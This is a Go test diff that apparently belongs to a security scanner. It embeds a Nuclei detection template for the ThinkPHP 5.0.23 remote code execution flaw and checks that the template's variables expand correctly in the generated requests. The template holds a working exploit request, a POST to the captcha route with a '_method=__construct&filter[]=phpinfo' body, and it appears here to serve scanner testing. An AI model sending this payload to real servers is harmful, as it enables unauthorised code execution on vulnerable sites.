@@ -149,3 +149,69 @@ requests:
 		panic(1)
 	}
 }
+
+func TestThinkphpPacket_Vars(t *testing.T) {
+	tpl, err := CreateYakTemplateFromNucleiTemplateRaw(`id: thinkphp-5023-rce
+
+info:
+  name: ThinkPHP 5.0.23 - Remote Code Execution
+  author: dr_set
+  severity: critical
+  description: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
+  tags: thinkphp,rce
+
+variables:
+  a1: "{{rand_int(1000,9000)}}"
+  a2: "{{rand_int(1000,9000)}}"
+  a4: "{{rand_int(1000,9000)}}{{a2}}------{{a1+a2}}=={{a1}}+{{a2}}  {{to_number(a1)*to_number(a2)}}=={{a1}}*{{a2}}" 
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=captcha--------a5{{a4}}"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1--------a5{{a4}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+          - "ThinkPHP"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by md on 2022/10/05`)
+	if err != nil {
+		panic(err)
+	}
+
+	checked := false
+	for req := range tpl.generateRequests() {
+		var reqIns = req.Requests[0]
+		println(string(reqIns.Raw))
+		if bytes.Contains(req.Requests[0].Raw, []byte("\r\n\r\n_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1")) && bytes.Contains(reqIns.Raw, []byte("{{params(a4)")) {
+			checked = true
+		}
+	}
+
+	if tpl.Variables == nil {
+		panic("empty variables")
+	}
+	spew.Dump(tpl.Variables.ToMap())
+	if len(tpl.Variables.ToMap()) != 3 {
+		panic(1)
+	}
+
+	if !checked {
+		panic(1)
+	}
+}
